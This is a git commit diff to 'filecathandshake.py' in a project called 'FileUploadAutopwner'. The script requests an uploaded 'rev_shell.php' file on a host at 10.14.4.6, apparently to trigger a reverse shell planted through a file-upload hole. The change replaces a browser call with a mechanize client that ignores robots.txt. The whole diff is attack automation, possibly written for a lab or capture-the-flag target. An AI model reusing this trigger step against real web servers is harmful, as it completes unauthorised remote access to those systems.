af153978d0027922f020332fcd8cc36a062a763f
amnash002 <30554241+amnash002@users.noreply.github.com>
2018-07-18 21:38:28 +0200

    Update filecathandshake.py

--- FileUploadAutopwner/filecathandshake.py
+++ FileUploadAutopwner/filecathandshake.py
@@ -1,11 +1,17 @@
 import webbrowser
 import sys
 import time
+import mechanize
 
 #possibly just wait a few seconds first
 
-time.sleep(1)
+time.sleep(2)
 name = sys.argv[1]
 idstr = sys.argv[2]
 
-webbrowser.open('http://10.14.4.6/upload/'+idstr+'/'+name+'/'+name+'rev_shell.php',new=2)
+#webbrowser.open('http://10.14.4.6/upload/'+idstr+'/'+name+'/'+name+'rev_shell.php',new=2)
+
+url = 'http://10.14.4.6/upload/'+idstr+'/'+name+'/'+name+'rev_shell.php'
+op = mechanize.Browser()
+op.set_handle_robots(False)
+op.open(url)
